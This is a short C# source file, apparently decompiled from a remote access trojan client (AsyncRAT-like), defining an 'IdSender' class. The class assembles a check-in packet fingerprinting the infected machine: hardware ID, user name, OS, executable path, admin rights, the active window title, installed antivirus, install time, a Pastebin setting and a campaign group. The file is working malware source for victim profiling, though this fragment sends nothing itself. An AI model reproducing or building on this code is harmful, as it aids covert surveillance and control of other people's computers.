using System;
using System.IO;
using System.Windows.Forms;
using MessagePackLib.MessagePack;
using Microsoft.VisualBasic.Devices;

namespace Client.Helper
{
	// Token: 0x02000008 RID: 8
	public static class IdSender
	{
		// Token: 0x0600002F RID: 47 RVA: 0x00003788 File Offset: 0x00001988
		public static byte[] SendInfo()
		{
			MsgPack msgPack = new MsgPack();
			msgPack.ForcePathObject("Packet").AsString = "ClientInfo";
			msgPack.ForcePathObject("HWID").AsString = Settings.Hwid;
			msgPack.ForcePathObject("User").AsString = Environment.UserName.ToString();
			msgPack.ForcePathObject("OS").AsString = new ComputerInfo().OSFullName.ToString().Replace("Microsoft", null) + " " + Environment.Is64BitOperatingSystem.ToString().Replace("True", "64bit").Replace("False", "32bit");
			msgPack.ForcePathObject("Path").AsString = Application.ExecutablePath;
			msgPack.ForcePathObject("Version").AsString = Settings.Version;
			msgPack.ForcePathObject("Admin").AsString = Methods.IsAdmin().ToString().ToLower()
				.Replace("true", "Admin")
				.Replace("false", "User");
			msgPack.ForcePathObject("Performance").AsString = Methods.GetActiveWindowTitle();
			msgPack.ForcePathObject("Pastebin").AsString = Settings.Pastebin;
			msgPack.ForcePathObject("Antivirus").AsString = Methods.Antivirus();
			msgPack.ForcePathObject("Installed").AsString = new FileInfo(Application.ExecutablePath).LastWriteTime.ToUniversalTime().ToString();
			msgPack.ForcePathObject("Pong").AsString = "";
			msgPack.ForcePathObject("Group").AsString = Settings.Group;
			return msgPack.Encode2Bytes();
		}
	}
}
